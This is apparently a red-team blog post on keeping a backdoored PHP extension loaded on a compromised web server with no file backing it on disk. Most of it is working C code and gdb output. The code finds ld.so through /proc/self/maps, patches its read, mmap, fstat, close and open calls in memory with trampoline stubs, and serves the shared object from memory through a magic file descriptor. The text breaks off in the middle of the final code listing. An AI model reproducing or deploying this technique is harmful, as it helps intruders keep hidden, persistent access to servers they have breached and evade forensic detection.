---
title: "Spice up your persistence: loading PHP extensions from memory"
date: 2022-12-26 00:00:00 +00:00
modified: 2022-12-26 00:00:00 +00:00
tags: [red team, research, X-C3LL]
description: Load shared object (PHP extension) from memory
image: 
---

Dear Fell**owl**ship, today's homily is about how to improve persistences based on PHP extensions. In this gospel we will explain a way to keep a PHP extension loaded on the server without it being backed up by a file on disk. Please, take a seat and listen the story.

# Prayers at the foot of the Altar a.k.a. disclaimer
*There are dozens different ways to achieve the same goal, some of them better and other worse. We are aware that the technique shown in this article can be improved making it more OPSEC friendly. This was just a simple PoC I had in mind since a few months ago and never had time to implement it, so I decided to use xmas time to write a PoC and publish about the idea. Kudos to [@lockedbyte](https://twitter.com/lockedbyte) for spotting some bugs.*

# Introduction

Using backdoored plugins/addins/extensions as persistence method is one of my favorite techniques to keep a door open after compromising a web server (indeed I wrote about this topic in multiple times in last years: [Backdoors in XAMPP stack (part I): PHP extensions](https://www.tarlogic.com/blog/backdoors-php-extensions/), [Backdoors in XAMP stack (part II): UDF in MySQL](https://www.tarlogic.com/blog/backdoors-in-xamp-stack-part-ii-udf-in-mysql/), [Backdoors in XAMP stack (part III): Apache Modules](https://www.tarlogic.com/blog/backdoors-modules-apache/) and [Improving PHP extensions as a persistence method](https://x-c3ll.github.io/posts/PHP-extension-backdoor/).  

Today's article is a direct continuation of the PHP extensions saga, serving as the end of the trilogy. It is therefore **MANDATORY** to read the two previous articles (they are listed above) in order to understand this one. Please read them and then continue reading __:)__

As a quick recap from the last article, we were abusing two PHP "hooks" (`MINIT` & `MSHUTDOWN`) to execute code as root when the module would be loaded/unloaded. With `MINIT` code we saved the shared object in memory (just a copy) and deleted the .so from disk (also we modified the `php.ini` file to remove path), then with `MSHUTDOWN` (executed when the server is stoped or restarted) we wrote the .so from memory to disk and set again the extension path in `php.ini`, so the next time the server starts it would load again our code and the cycle continues. 

The problem is that even if the file is removed from disk we can see it referenced in the mapped regions:

```c
7fa44e763000-7fa44e765000 r--p 00000000 08:01 2816412                    /home/vagrant/research/php/backdoor/adepts/adepts.so
7fa44e765000-7fa44e767000 r-xp 00002000 08:01 2816412                    /home/vagrant/research/php/backdoor/adepts/adepts.so
7fa44e767000-7fa44e768000 r--p 00004000 08:01 2816412                    /home/vagrant/research/php/backdoor/adepts/adepts.so
7fa44e768000-7fa44e769000 r--p 00004000 08:01 2816412                    /home/vagrant/research/php/backdoor/adepts/adepts.so
7fa44e769000-7fa44e76a000 rw-p 00005000 08:01 2816412                    /home/vagrant/research/php/backdoor/adepts/adepts.so
```

So, how can we remove this? There are multiple ways to approach it, here we are going to force our extension to load a copy from memory and then unload itself.

<figure>
<img src="/dlopen-from-memory-PHP/php.png" alt="Steps to follow">
<figcaption>
Steps to follow.
</figcaption>
</figure>


# Trimming the fat

The first thing we need to understand is how PHP loads an extension and how the 4 hooks (`MINIT/MSHUTDOWN` and `RINIT/RSHUTDOWN`) are set. Let's create a minimal extension:

```bash
php ../php-8.2.0/ext/ext_skel.php --ext adepts --dir .
cd adepts
phpize
./configure
make
```
Load it in a debugger and put a breakpoint at `dlopen()`:
```c
=> gdb php
pwndbg> b *dlopen
Breakpoint 1 at 0x203640
pwndbg> r -d "extension=/home/vagrant/research/php/backdoor/adepts/adepts.so"
Starting program: /usr/local/bin/php -d "extension=/home/vagrant/research/php/backdoor/adepts/adepts.so"
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, ___dlopen (file=0x7ffff5805038 "/home/vagrant/research/php/backdoor/adepts/adepts.so", mode=265) at ./dlfcn/dlopen.c:77

 =>f 0   0x7ffff7b49700 dlopen
   f 1   0x55555595d5d4 php_load_shlib+37
   f 2   0x55555595d7b1 php_load_extension+424
   f 3   0x555555a97969 php_load_php_extension_cb+41
   f 4   0x555555b3cb8e zend_llist_apply+50
   f 5   0x555555a98be1 php_ini_register_extensions+58
   f 6   0x555555a8d278 php_module_startup+2413
   f 7   0x555555e08ab5 php_cli_startup+33
```

We can observe that the function `php_load_extension` is the one that loads the extension. This function can be found at [/ext/standard/dl.c](https://github.com/php/php-src/blob/2e3d13e555438d0d8110d7c7e088e7cb7e8610fb/ext/standard/dl.c#L110), being the most interesting part:

```c
zend_module_entry *module_entry;

zend_module_entry *(*get_module)(void);

//...

handle = php_load_shlib(libpath, &err2);
//...

get_module = (zend_module_entry *(*)(void)) DL_FETCH_SYMBOL(handle, "get_module");

//...

module_entry = get_module();
//...
if ((module_entry = zend_register_module_ex(module_entry)) == NULL) {

    DL_UNLOAD(handle);

    return FAILURE;

}

if ((type == MODULE_TEMPORARY || start_now) && zend_startup_module_ex(module_entry) == FAILURE) {

    DL_UNLOAD(handle);

    return FAILURE;

}
```

As we can see the code looks for the exported symbol `get_module` and executes it as a function that returns a pointer to a `zend_module_entry` structure. This structure is described as:
```c
struct _zend_module_entry {

    unsigned short size;

    unsigned int zend_api;

    unsigned char zend_debug;

    unsigned char zts;

    const struct _zend_ini_entry *ini_entry;

    const struct _zend_module_dep *deps;

    const char *name;

    const struct _zend_function_entry *functions;

    zend_result (*module_startup_func)(INIT_FUNC_ARGS);

    zend_result (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS);

    zend_result (*request_startup_func)(INIT_FUNC_ARGS);

    zend_result (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS);

    void (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS);

    const char *version;

    size_t globals_size;

    #ifdef ZTS

    ts_rsrc_id* globals_id_ptr;

    #else

    void* globals_ptr;

    #endif

    void (*globals_ctor)(void *global);

    void (*globals_dtor)(void *global);

    zend_result (*post_deactivate_func)(void);

    int module_started;

    unsigned char type;

    void *handle;

    int module_number;

    const char *build_id;

};
```
The most relevant part is 

```c
//...

    zend_result (*module_startup_func)(INIT_FUNC_ARGS);

    zend_result (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS);

    zend_result (*request_startup_func)(INIT_FUNC_ARGS);

    zend_result (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS);
//...
```

We do not need to use macros like `PHP_MINIT_FUNCTION` as only need to set these members with pointers to functions that returns a `zend_result` type. A minimum skeleton would be:

```c
/* adepts extension for PHP */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include "php.h"
#include "ext/standard/info.h"
#include "php_adepts.h"

/* For compatibility with older PHP versions */
#ifndef ZEND_PARSE_PARAMETERS_NONE
#define ZEND_PARSE_PARAMETERS_NONE() \
    ZEND_PARSE_PARAMETERS_START(0, 0) \
    ZEND_PARSE_PARAMETERS_END()
#endif


// Basic zend_module_entry
zend_module_entry adepts_module_entry = {
    STANDARD_MODULE_HEADER,
    "adepts",                   /* Extension name */
    NULL,                   /* zend_function_entry */
    NULL,                           /* PHP_MINIT - Module initialization */
    NULL,                           /* PHP_MSHUTDOWN - Module shutdown */
    NULL,           /* PHP_RINIT - Request initialization */
    NULL,                           /* PHP_RSHUTDOWN - Request shutdown */
    NULL,           /* PHP_MINFO - Module info */
    PHP_ADEPTS_VERSION,     /* Version */
    STANDARD_MODULE_PROPERTIES
};

//Function "get_module" that will be executed by PHP
extern zend_module_entry *get_module(void){
    printf("[*] This function was called from get_module when the extension was attempted to be load\n");
    return &adepts_module_entry;
}



#ifdef COMPILE_DL_ADEPTS
# ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
# endif
ZEND_GET_MODULE(adepts)
#endif
```

Let's compile it:

```bash
gcc adepts.c -shared -fPIC -o adepts.so -I/usr/local/include/php -I/usr/local/include/php/main -I/usr/local/include/php/TSRM -I/usr/local/include/php/Zend -I/usr/local/include/php/ext -I/usr/local/include/php/ext/date/lib
```

And test:

```bash
=> php  -d "extension=/home/vagrant/research/php/backdoor/adepts/adepts.so" -r "echo 'hello\n';"
[*] This function was called from get_module when the extension was attempted to be load
hello\n% 
```

# dlopen() from memory

There are different options to load our extension directly from memory and not from disk. In this case I am going to borrow code from [memdlopen project](https://github.com/m1m1x/memdlopen) to patch `ld.so`. First we need to add code to parse `/proc/self/maps` and locate `ld.so`:

```c
/* adepts extension for PHP */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include "php.h"
#include "ext/standard/info.h"
#include "php_adepts.h"

/* For compatibility with older PHP versions */
#ifndef ZEND_PARSE_PARAMETERS_NONE
#define ZEND_PARSE_PARAMETERS_NONE() \
    ZEND_PARSE_PARAMETERS_START(0, 0) \
    ZEND_PARSE_PARAMETERS_END()
#endif


size_t page_size;


bool find_ld_in_memory(uint64_t *addr1, uint64_t *addr2) {
    FILE* f = NULL;
    char  buffer[1024] = {0};
    char* tmp = NULL;
    char* start = NULL;
    char* end = NULL;
    bool  found = false;

    if ((f = fopen("/proc/self/maps", "r")) == NULL){
        return found;
    }

    while ( fgets(buffer, sizeof(buffer), f) ){
        if ( strstr(buffer, "r-xp") == 0 ) {
            continue;
        }
        if ( strstr(buffer, "ld-linux-x86-64.so.2") == 0 ) {
            continue;        
        }

        buffer[strlen(buffer)-1] = 0;
        tmp = strrchr(buffer, ' ');
        if ( tmp == NULL || tmp[0] != ' ')
            continue;
        ++tmp;

        start = strtok(buffer, "-");
        *addr1 = strtoul(start, NULL, 16);
        end = strtok(NULL, " ");
        *addr2 = strtoul(end, NULL, 16);
        found = true;
    }
    fclose(f);
    return found;
}

void patch_all(void){
    uint64_t start = 0;
    uint64_t end = 0;
    size_t i = 0;
    
    page_size = sysconf(_SC_PAGESIZE);

    if (!find_ld_in_memory(&start, &end)){
        return;
    }
    printf("[*] ld.so found in range [0x%lx-0x%lx]\n", start, end);

    return;
}



// Basic zend_module_entry
zend_module_entry adepts_module_entry = {
    STANDARD_MODULE_HEADER,
    "adepts",                   /* Extension name */
    NULL,                   /* zend_function_entry */
    NULL,                           /* PHP_MINIT - Module initialization */
    NULL,                           /* PHP_MSHUTDOWN - Module shutdown */
    NULL,           /* PHP_RINIT - Request initialization */
    NULL,                           /* PHP_RSHUTDOWN - Request shutdown */
    NULL,           /* PHP_MINFO - Module info */
    PHP_ADEPTS_VERSION,     /* Version */
    STANDARD_MODULE_PROPERTIES
};

//Function "get_module" that will be executed by PHP
extern zend_module_entry *get_module(void){
    patch_all();
    return &adepts_module_entry;
}



#ifdef COMPILE_DL_ADEPTS
# ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
# endif
ZEND_GET_MODULE(adepts)
#endif
```

My lab uses more recent versions of glibc...

```bash
=> lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:    22.04
Codename:   jammy

=> ldd --version 
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
```

...so we have to update the signatures to find where the hooks have to be inserted. Let's create an extension that hooks `ld.so` and traces the execution:


```c
/* adepts extension for PHP */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include "php.h"
#include "ext/standard/info.h"
#include "php_adepts.h"

 #include <sys/mman.h>

/* For compatibility with older PHP versions */
#ifndef ZEND_PARSE_PARAMETERS_NONE
#define ZEND_PARSE_PARAMETERS_NONE() \
    ZEND_PARSE_PARAMETERS_START(0, 0) \
    ZEND_PARSE_PARAMETERS_END()
#endif




typedef struct {
    void * data;
    int size;
    int current;
} lib_t;

lib_t libdata;


char stub[] = {0x55, 0x48, 0x89, 0xe5, 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xd0, 0xc9, 0xc3};
size_t stub_length = 18;

#define LIBC "/lib/x86_64-linux-gnu/libc.so.6"


int     my_open(const char *pathname, int flags); 
off_t   my_pread64(int fd, void *buf, size_t count, off_t offset);
ssize_t my_read(int fd, void *buf, size_t count);
void *  my_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int     my_fstat(int fd, struct stat *buf);
int     my_close(int fd);


/*
pwndbg> disassemble 0x7ffff7fc99ad,+20
Dump of assembler code from 0x7ffff7fc99ad to 0x7ffff7fc99c1:
   0x00007ffff7fc99ad <open_verify+109>:    sub    rdx,rax
   0x00007ffff7fc99b0 <open_verify+112>:    lea    rsi,[rdi+rax*1]
   0x00007ffff7fc99b4 <open_verify+116>:    mov    edi,r15d
   0x00007ffff7fc99b7 <open_verify+119>:    call   0x7ffff7fe9b80 <__GI___read_nocancel>

*/
const char read_pattern[] = {0x48, 0x29, 0xc2, 0x48,  0x8d, 0x34,  0x07, 0x44, 0x89, 0xff, 0xe8};
#define read_pattern_length 11

/*
pwndbg> disass 0x7ffff7fcc088,+40
Dump of assembler code from 0x7ffff7fcc088 to 0x7ffff7fcc0b0:
   0x00007ffff7fcc088 <_dl_map_object_from_fd+1208>:    mov    ecx,0x812
   0x00007ffff7fcc08d <_dl_map_object_from_fd+1213>:    mov    DWORD PTR [rbp-0xe0],r11d
   0x00007ffff7fcc094 <_dl_map_object_from_fd+1220>:    call   0x7ffff7fe9cc0 <__mmap64>
*/
const char mmap_pattern[] = {0xb9, 0x12, 0x08, 0x00, 0x00, 0x44, 0x89, 0x9d, 0x20, 0xff, 0xff, 0xff, 0xe8};
#define mmap_pattern_length 13

/*
pwndbg> disass 0x7ffff7fcc0c8,+20
Dump of assembler code from 0x7ffff7fcc0c8 to 0x7ffff7fcc0dc:
   0x00007ffff7fcc0c8 <_dl_map_object_from_fd+1272>:    mov    edi,DWORD PTR [rbp-0xd4]
   0x00007ffff7fcc0ce <_dl_map_object_from_fd+1278>:    lea    rsi,[rbp-0xc0]
   0x00007ffff7fcc0d5 <_dl_map_object_from_fd+1285>:    call   0x7ffff7fe98a0 <__GI___fstat64>
   */
const char fxstat_pattern[] = {0x8b, 0xbd, 0x2c, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xb5, 0x40, 0xff, 0xff, 0xff, 0xe8};
#define fxstat_pattern_length 14

/*
pwndbg> disass 0x7ffff7fcc145,+40
Dump of assembler code from 0x7ffff7fcc145 to 0x7ffff7fcc16d:
   0x00007ffff7fcc145 <_dl_map_object_from_fd+1397>:    mov    edi,DWORD PTR [rbp-0xd4]
   0x00007ffff7fcc14b <_dl_map_object_from_fd+1403>:    call   0x7ffff7fe99f0 <__GI___close_nocancel>
*/
const char close_pattern[] = {0x8b, 0xbd, 0x2c, 0xff, 0xff, 0xff, 0xe8};
#define close_pattern_length 7

/*
pwndbg> disass 0x7ffff7fc996a,+40
Dump of assembler code from 0x7ffff7fc996a to 0x7ffff7fc9992:
   0x00007ffff7fc996a <open_verify+42>: mov    esi,0x80000
   0x00007ffff7fc996f <open_verify+47>: mov    rdi,r14
   0x00007ffff7fc9972 <open_verify+50>: xor    eax,eax
   0x00007ffff7fc9974 <open_verify+52>: call   0x7ffff7fe9b00 <__GI___open64_nocancel>
*/
const char open_pattern[] = {0xbe, 0x00, 0x00, 0x08, 0x00, 0x4c, 0x89, 0xf7, 0x31, 0xc0, 0xe8};
#define open_pattern_length 11

/*
pwndbg> disass 0x00007ffff7fcc275,+40
Dump of assembler code from 0x7ffff7fcc275 to 0x7ffff7fcc29d:
   0x00007ffff7fcc275 <_dl_map_object_from_fd+1701>:    mov    rsi,rax
   0x00007ffff7fcc278 <_dl_map_object_from_fd+1704>:    mov    QWORD PTR [rbp-0x158],rax
   0x00007ffff7fcc27f <_dl_map_object_from_fd+1711>:    call   0x7ffff7fe9bb0 <__GI___pread64_nocancel>
*/
const char pread64_pattern[] = {0x48, 0x89, 0xc6, 0x48, 0x89, 0x85, 0xa8, 0xfe, 0xff, 0xff, 0xe8};
#define pread64_pattern_length 11

const char* patterns[] = {read_pattern, mmap_pattern, pread64_pattern, fxstat_pattern, close_pattern,
                          open_pattern, NULL};
const size_t pattern_lengths[] = {read_pattern_length, mmap_pattern_length, pread64_pattern_length, 
                                  fxstat_pattern_length, close_pattern_length, open_pattern_length, 0};
const char* symbols[] = {"read", "mmap", "pread", "fstat", "close", "open", NULL};
uint64_t functions[] = {(uint64_t)&my_read, (uint64_t)&my_mmap, (uint64_t)&my_pread64, (uint64_t)&my_fstat, 
                        (uint64_t)&my_close, (uint64_t)&my_open, 0}; 
char *fixes[7] = {0};

uint64_t fix_locations[7] = {0};
size_t page_size;


bool find_ld_in_memory(uint64_t *addr1, uint64_t *addr2) {
    FILE* f = NULL;
    char  buffer[1024] = {0};
    char* tmp = NULL;
    char* start = NULL;
    char* end = NULL;
    bool  found = false;

    if ((f = fopen("/proc/self/maps", "r")) == NULL){
        return found;
    }

    while ( fgets(buffer, sizeof(buffer), f) ){
        if ( strstr(buffer, "r-xp") == 0 ) {
            continue;
        }
        if ( strstr(buffer, "ld-linux-x86-64.so.2") == 0 ) {
            continue;        
        }

        buffer[strlen(buffer)-1] = 0;
        tmp = strrchr(buffer, ' ');
        if ( tmp == NULL || tmp[0] != ' ')
            continue;
        ++tmp;

        start = strtok(buffer, "-");
        *addr1 = strtoul(start, NULL, 16);
        end = strtok(NULL, " ");
        *addr2 = strtoul(end, NULL, 16);
        found = true;
    }
    fclose(f);
    return found;
}


/* hooks */

int my_open(const char *pathname, int flags) {
    void *handle;
    int (*mylegacyopen)(const char *pathnam, int flags);

    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyopen = dlsym(handle, "open");
    printf("\t[+] Inside hooked open (ARG: %s)\n", pathname);
    return mylegacyopen(pathname, flags);
}

ssize_t my_read(int fd, void *buf, size_t count){
    void *handle;
    ssize_t (*mylegacyread)(int fd, void *buf, size_t count);

    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyread = dlsym(handle, "read");
    printf("\t[+] Inside hooked read (FD: %d)\n", fd);
    return mylegacyread(fd, buf, count);
}

void * my_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset){
    int mflags = 0;
    void * ret = NULL;
    uint64_t start = 0;
    
    printf("\t[+] Inside hooked mmap\n");
    return mmap(addr, length, prot, flags, fd, offset);
}


int my_fstat(int fd, struct stat *buf){
    void *handle;
    int (*mylegacyfstat)(int fd, struct stat *buf);


    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyfstat = dlsym(handle, "fstat64");

    printf("\t[+] Inside hooked fstat (FD: %d)\n", fd);
    return mylegacyfstat(fd, buf);
}

int my_close(int fd) {
    printf("\t[+] Inside Hooked close (FD: %d)\n", fd);
    return close(fd);
}

ssize_t my_pread64(int fd, void *buf, size_t count, off_t offset) {
    void *handle;
    int (*mylegacypread)(int fd, void *buf, size_t count);

    handle = dlopen(LIBC, RTLD_NOW);
    mylegacypread = dlsym(handle, "pread");
    printf("\t[+] Inside pread64 (FD: %d)\n", fd);
    return mylegacypread(fd, buf, count);
}


/* Patch ld.so */
bool search_and_patch(uint64_t start_addr, uint64_t end_addr, const char* pattern, const size_t length, const char* symbol, const uint64_t replacement_addr, int position) {

    bool     found = false;
    int32_t  offset = 0;
    uint64_t tmp_addr = 0;
    uint64_t symbol_addr = 0;
    char * code = NULL;
    void * page_addr = NULL;

    tmp_addr = start_addr;
    while ( ! found && tmp_addr+length < end_addr) {
        if ( memcmp((void*)tmp_addr, (void*)pattern, length) == 0 ) {
            found = true;
            continue;
        }
        ++tmp_addr;
    }

    if ( ! found ) {
        return false;
    }

    offset = *((uint64_t*)(tmp_addr + length));
    symbol_addr = tmp_addr + length + 4 + offset;

    //Save data to fix later
    fixes[position] = malloc(stub_length * sizeof(char));
    memcpy(fixes[position], (void*)symbol_addr, stub_length);
    fix_locations[position] = symbol_addr;
    printf("[*] Symbol: %s - Addr: %lx\n", symbol, fix_locations[position]);

    code = malloc(stub_length * sizeof(char));
    memcpy(code, stub, stub_length);
    memcpy(code+6, &replacement_addr, sizeof(uint64_t));

    page_addr = (void*) (((size_t)symbol_addr) & (((size_t)-1) ^ (page_size - 1)));
    mprotect(page_addr, page_size, PROT_READ | PROT_WRITE); 
    memcpy((void*)symbol_addr, code, stub_length);
    mprotect(page_addr, page_size, PROT_READ | PROT_EXEC); 
    return true;
}

/* Read file from disk */
bool load_library_from_file(char * path, lib_t *libdata) {
    struct stat st;
    FILE * file;
    size_t read;

    if ( stat(path, &st) < 0 ) {
        return false;
    }

    libdata->size = st.st_size;
    libdata->data = malloc( st.st_size );
    libdata->current = 0;

    file = fopen(path, "r");

    read = fread(libdata->data, 1, st.st_size, file);
    fclose(file);

    return true;
}


void patch_all(void){
    uint64_t start = 0;
    uint64_t end = 0;
    size_t i = 0;
    
    page_size = sysconf(_SC_PAGESIZE);
    printf("\t\t-=[ Proof of Concept ]=-\n\n");

   /* if (!load_library_from_file("/home/vagrant/research/php/backdoor/adepts/adepts.so", &libdata)){
        return;
    }*/
    if (!find_ld_in_memory(&start, &end)){
        return;
    }
    printf("[*] ld.so found in range [0x%lx-0x%lx]\n", start, end);
    printf("-------------[ Patching  ]-------------\n");
    while ( patterns[i] != NULL ) {
        if ( ! search_and_patch(start, end, patterns[i], pattern_lengths[i], symbols[i], functions[i], i) ) {     
            return;
        } 
        ++i;
    }
    printf("---------------------------------------\n");
    return;
}



// Basic zend_module_entry
zend_module_entry adepts_module_entry = {
    STANDARD_MODULE_HEADER,
    "adepts",                   /* Extension name */
    NULL,                   /* zend_function_entry */
    NULL,                           /* PHP_MINIT - Module initialization */
    NULL,                           /* PHP_MSHUTDOWN - Module shutdown */
    NULL,           /* PHP_RINIT - Request initialization */
    NULL,                           /* PHP_RSHUTDOWN - Request shutdown */
    NULL,           /* PHP_MINFO - Module info */
    PHP_ADEPTS_VERSION,     /* Version */
    STANDARD_MODULE_PROPERTIES
};

//Function "get_module" that will be executed by PHP
extern zend_module_entry *get_module(void){
    patch_all();
    void *handler = dlopen("/home/vagrant/research/php/backdoor/adepts/test.so", RTLD_NOW); 
    return &adepts_module_entry;
}



#ifdef COMPILE_DL_ADEPTS
# ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
# endif
ZEND_GET_MODULE(adepts)
#endif
```

My `test.so` is just a shared object that prints a message when loaded:

```bash
=> php  -d "extension=/home/vagrant/research/php/backdoor/adepts/adepts.so" -r "echo 1;" 
        -=[ Proof of Concept ]=-

[*] ld.so found in range [0x7f5dd6999000-0x7f5dd69c3000]
-------------[ Patching  ]-------------
[*] Symbol: read - Addr: 7f5dd69bdb80
[*] Symbol: mmap - Addr: 7f5dd69bdcc0
[*] Symbol: pread - Addr: 7f5dd69bdbb0
[*] Symbol: fstat - Addr: 7f5dd69bd8a0
[*] Symbol: close - Addr: 7f5dd69bd9f0
[*] Symbol: open - Addr: 7f5dd69bdb00
---------------------------------------
    [+] Inside hooked open (ARG: /home/vagrant/research/php/backdoor/adepts/test.so)
    [+] Inside hooked read (FD: 3)
    [+] Inside hooked fstat (FD: 3)
    [+] Inside hooked mmap
    [+] Inside hooked mmap
    [+] Inside hooked mmap
    [+] Inside hooked mmap
    [+] Inside Hooked close (FD: 3)
Lib initialized successfully!
1% 
```

Now that we checked our hooks were successfully deployed it's time to add the real functionalities to them. First we have to do is detect, at `open()`, if the path provided matches a magic word (in this case we use "magic.so"), if so we have to return a magic value as file descriptor (0x69). 

```c
int my_open(const char *pathname, int flags) {
    void *handle;
    int (*mylegacyopen)(const char *pathnam, int flags);

    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyopen = dlsym(handle, "open");
    if (strstr(pathname, "magic.so") != 0){
        printf("\t[+] Open called with magic word. Returning magic FD (0x69)\n");
        return 0x69;
    }
    return mylegacyopen(pathname, flags);
}
```

Next we have to modify `read()` to return the extension contents from memory (we readed the file before).

```c
ssize_t my_read(int fd, void *buf, size_t count){
    void *handle;
    ssize_t (*mylegacyread)(int fd, void *buf, size_t count);

    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyread = dlsym(handle, "read");
    if (fd == 0x69){
        size_t size = 0;
        if ( libdata.size - libdata.current >= count ) {
            size = count;
        } else {
            size = libdata.size - libdata.current;
        }
        memcpy(buf, libdata.data+libdata.current, size);
        libdata.current += size;
        printf("\t[+] Read called with magic FD. Returning %ld bytes from memory\n", size);
        return size;
    }
    return mylegacyread(fd, buf, count);
}
```

Also we have to modify `fstat64()` so it returns a congruent value:

```c
int my_fstat(int fd, struct stat *buf){
    void *handle;
    int (*mylegacyfstat)(int fd, struct stat *buf);


    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyfstat = dlsym(handle, "fstat64");

    if ( fd == 0x69 ) {
        memset(buf, 0, sizeof(struct stat));
        buf->st_size = libdata.size;
        buf->st_ino = 0x666; // random number
        printf("\t[+] Inside hooked fstat64 (fd: 0x%x)\n", fd);
        return 0;
    }
    return mylegacyfstat(fd, buf);
}
```

Then we have to map the file contents in anonymous sections and modify the memory perms:

```c
void * my_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset){
    int mflags = 0;
    void * ret = NULL;
    uint64_t start = 0;
    size_t size = 0;

    if ( fd == 0x69 ) {
        mflags = MAP_PRIVATE|MAP_ANON;
        if ( (flags & MAP_FIXED) != 0 ) {
            mflags |= MAP_FIXED;
        }
        ret = mmap(addr, length, PROT_READ|PROT_WRITE|PROT_EXEC, mflags, -1, 0);
        size = length > libdata.size - offset ? libdata.size - offset : length;
        memcpy(ret, libdata.data + offset, size);
        mprotect(ret, size, prot);
        if (first == 0){
            first = (uint64_t)ret;
        }
        printf("\t[+] Inside hooked mmap (fd: 0x%x)\n", fd);
        return ret;
    }
    return mmap(addr, length, prot, flags, fd, offset);
}
 ```

And lastly we edit `close()` hook to return "0" as we never opened the file descriptor.

```c
int my_close(int fd) {
    if (fd == 0x69){
        printf("\t[+] Inside hooked close (fd: 0x%x)\n", fd);
        return 0;
    }
    return close(fd);
}
```

So the final code is:

```c
/* adepts extension for PHP */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include "php.h"
#include "ext/standard/info.h"
#include "php_adepts.h"

 #include <sys/mman.h>

/* For compatibility with older PHP versions */
#ifndef ZEND_PARSE_PARAMETERS_NONE
#define ZEND_PARSE_PARAMETERS_NONE() \
    ZEND_PARSE_PARAMETERS_START(0, 0) \
    ZEND_PARSE_PARAMETERS_END()
#endif




typedef struct {
    void * data;
    size_t size;
    size_t current;
} lib_t;

lib_t libdata;


char stub[] = {0x55, 0x48, 0x89, 0xe5, 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xd0, 0xc9, 0xc3};
size_t stub_length = 18;

#define LIBC "/lib/x86_64-linux-gnu/libc.so.6"


int     my_open(const char *pathname, int flags); 
off_t   my_pread64(int fd, void *buf, size_t count, off_t offset);
ssize_t my_read(int fd, void *buf, size_t count);
void *  my_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int     my_fstat(int fd, struct stat *buf);
int     my_close(int fd);


/*
pwndbg> disassemble 0x7ffff7fc99ad,+20
Dump of assembler code from 0x7ffff7fc99ad to 0x7ffff7fc99c1:
   0x00007ffff7fc99ad <open_verify+109>:    sub    rdx,rax
   0x00007ffff7fc99b0 <open_verify+112>:    lea    rsi,[rdi+rax*1]
   0x00007ffff7fc99b4 <open_verify+116>:    mov    edi,r15d
   0x00007ffff7fc99b7 <open_verify+119>:    call   0x7ffff7fe9b80 <__GI___read_nocancel>

*/
const char read_pattern[] = {0x48, 0x29, 0xc2, 0x48,  0x8d, 0x34,  0x07, 0x44, 0x89, 0xff, 0xe8};
#define read_pattern_length 11

/*
pwndbg> disass 0x7ffff7fcc088,+40
Dump of assembler code from 0x7ffff7fcc088 to 0x7ffff7fcc0b0:
   0x00007ffff7fcc088 <_dl_map_object_from_fd+1208>:    mov    ecx,0x812
   0x00007ffff7fcc08d <_dl_map_object_from_fd+1213>:    mov    DWORD PTR [rbp-0xe0],r11d
   0x00007ffff7fcc094 <_dl_map_object_from_fd+1220>:    call   0x7ffff7fe9cc0 <__mmap64>
*/
const char mmap_pattern[] = {0xb9, 0x12, 0x08, 0x00, 0x00, 0x44, 0x89, 0x9d, 0x20, 0xff, 0xff, 0xff, 0xe8};
#define mmap_pattern_length 13

/*
pwndbg> disass 0x7ffff7fcc0c8,+20
Dump of assembler code from 0x7ffff7fcc0c8 to 0x7ffff7fcc0dc:
   0x00007ffff7fcc0c8 <_dl_map_object_from_fd+1272>:    mov    edi,DWORD PTR [rbp-0xd4]
   0x00007ffff7fcc0ce <_dl_map_object_from_fd+1278>:    lea    rsi,[rbp-0xc0]
   0x00007ffff7fcc0d5 <_dl_map_object_from_fd+1285>:    call   0x7ffff7fe98a0 <__GI___fstat64>
   */
const char fxstat_pattern[] = {0x8b, 0xbd, 0x2c, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xb5, 0x40, 0xff, 0xff, 0xff, 0xe8};
#define fxstat_pattern_length 14

/*
pwndbg> disass 0x7ffff7fcc145,+40
Dump of assembler code from 0x7ffff7fcc145 to 0x7ffff7fcc16d:
   0x00007ffff7fcc145 <_dl_map_object_from_fd+1397>:    mov    edi,DWORD PTR [rbp-0xd4]
   0x00007ffff7fcc14b <_dl_map_object_from_fd+1403>:    call   0x7ffff7fe99f0 <__GI___close_nocancel>
*/
const char close_pattern[] = {0x8b, 0xbd, 0x2c, 0xff, 0xff, 0xff, 0xe8};
#define close_pattern_length 7

/*
pwndbg> disass 0x7ffff7fc996a,+40
Dump of assembler code from 0x7ffff7fc996a to 0x7ffff7fc9992:
   0x00007ffff7fc996a <open_verify+42>: mov    esi,0x80000
   0x00007ffff7fc996f <open_verify+47>: mov    rdi,r14
   0x00007ffff7fc9972 <open_verify+50>: xor    eax,eax
   0x00007ffff7fc9974 <open_verify+52>: call   0x7ffff7fe9b00 <__GI___open64_nocancel>
*/
const char open_pattern[] = {0xbe, 0x00, 0x00, 0x08, 0x00, 0x4c, 0x89, 0xf7, 0x31, 0xc0, 0xe8};
#define open_pattern_length 11

/*
pwndbg> disass 0x00007ffff7fcc275,+40
Dump of assembler code from 0x7ffff7fcc275 to 0x7ffff7fcc29d:
